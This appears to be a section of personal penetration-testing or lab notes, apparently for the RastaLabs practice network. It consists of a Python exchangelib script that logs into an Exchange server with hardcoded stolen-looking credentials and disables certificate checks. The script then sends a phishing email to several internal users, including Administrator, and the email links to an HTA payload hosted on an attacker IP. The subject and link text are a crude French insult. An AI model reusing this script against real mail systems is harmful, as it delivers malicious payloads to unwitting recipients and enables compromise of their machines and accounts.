\section{Exchangelib}
\label{python:exchangelib}

\href{https://ecederstrand.github.io/exchangelib/}{Exchangelib doc}

\begin{verbatim}
from exchangelib import Configuration, Credentials, Account, Message, Mailbox, FileAttachment,DELEGATE, HTMLBody
import sys, json
# bypass SSL
from exchangelib.protocol import BaseProtocol, NoVerifyHTTPAdapter
BaseProtocol.HTTP_ADAPTER_CLS = NoVerifyHTTPAdapter

if __name__ == "__main__":
    U = 'RLAB\\ahope'
    P = 'Summer2023'

    ews_url = 'https://10.10.110.254/EWS/Exchange.asmx'
    ews_auth_type = 'NTLM'
    primary_smtp_address = 'ahope@rastalabs.local'

    cred = Credentials(U, P)
    config = Configuration(service_endpoint=ews_url, credentials=cred, auth_type=ews_auth_type)
    acc = Account(
        primary_smtp_address=primary_smtp_address, 
        config=config, autodiscover=False, 
        access_type=DELEGATE,
    )

    m = Message(
        account=acc,
        subject='Clickez bande de salopes',
        #body= '',
        body = HTMLBody('<html><body><a href="http://10.10.16.244/jubeaz.hta">Clickez bande de salopes</a></body></html>'),
        to_recipients=[Mailbox(email_address='ngodfrey@rastalabs.local'),
            Mailbox(email_address='tquinn@rastalabs.local'),
            Mailbox(email_address='bowen@rastalabs.local'),
            Mailbox(email_address='rweston@rastalabs.local'),
            Mailbox(email_address='Administrator@rastalabs.local'),
            Mailbox(email_address='epugh@rastalabs.local')
        ],
        cc_recipients=[
            Mailbox(email_address='ahope@rastalabs.local')
        ],
        #bcc_recipients=['another_mail@gmail.com']  # you can use just a string list.
    )
    #m.attach(FileAttachment(name='C:\\Temp\\file_to_atach.txt', content='string'.encode('utf-8')))
    m.send()
\end{verbatim}

